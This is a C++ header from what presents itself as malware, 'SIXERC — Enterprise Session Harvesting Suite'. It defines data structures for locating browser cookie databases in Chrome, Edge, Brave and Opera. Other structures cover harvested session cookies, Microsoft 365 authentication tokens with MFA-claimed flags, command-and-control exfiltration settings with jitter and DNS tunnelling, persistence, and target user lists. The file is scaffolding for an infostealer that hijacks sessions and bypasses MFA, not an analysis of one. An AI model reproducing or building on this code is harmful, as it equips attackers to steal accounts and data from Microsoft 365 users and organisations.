// ============================================================================
// SIXERC — Enterprise Session Harvesting Suite
// Codename: "Ekwensu's Grasp"
// Version: 1.0.0
// Author: Anonymous-beta (Chinedu)
// ============================================================================
// Core type definitions and data structures
// ============================================================================

#pragma once

#include <string>
#include <vector>
#include <cstdint>
#include <chrono>
#include <map>

namespace sixerc {

using byte = uint8_t;
using bytes = std::vector<byte>;

// Browser enumeration
enum class BrowserType {
    Chrome,
    Edge,
    Brave,
    Opera,
    Unknown
};

struct BrowserProfile {
    BrowserType type;
    std::wstring profile_path;
    std::wstring local_state_path;
    std::wstring cookies_db_path;
    std::string profile_name;
};

// Cookie structure
struct SessionCookie {
    std::string name;
    std::string value;
    std::string domain;
    std::string path;
    uint64_t expires_utc;
    bool is_secure;
    bool is_httponly;
    bool is_persistent;
    std::string browser_source;
    std::string profile_source;
};

// Token structure
struct M365Token {
    std::string token_type;      // ESTSAUTH, ESTSAUTHPERSISTENT, ESTSAUTHLIGHT
    std::string value;
    std::string domain;
    bool is_valid;
    bool mfa_claimed;
    std::chrono::system_clock::time_point expiry;
};

// Harvested session
struct HarvestedSession {
    std::string user_hint;
    std::vector<SessionCookie> cookies;
    std::vector<M365Token> tokens;
    std::string browser_fingerprint;
    std::string user_agent;
    std::chrono::system_clock::time_point harvested_at;
};

// Exfiltration configuration
struct C2Config {
    std::string primary_endpoint;
    std::string fallback_endpoint;
    std::string rsa_public_key_pem;
    uint32_t exfil_interval_seconds;
    uint32_t jitter_ms_min;
    uint32_t jitter_ms_max;
    bool use_dns_tunnel;
    bool use_file_drop;
};

// Operational configuration
struct OpConfig {
    C2Config c2;
    bool enable_persistence;
    bool enable_killswitch;
    uint32_t killswitch_timer_hours;
    std::vector<std::string> target_users;
};

// Service access types
enum class M365Service {
    Outlook,
    SharePoint,
    OneDrive,
    Teams,
    Calendar,
    Contacts,
    Planner
};

struct ServiceData {
    M365Service service;
    std::string endpoint;
    std::string raw_response;
    bool access_granted;
};

} // namespace sixerc
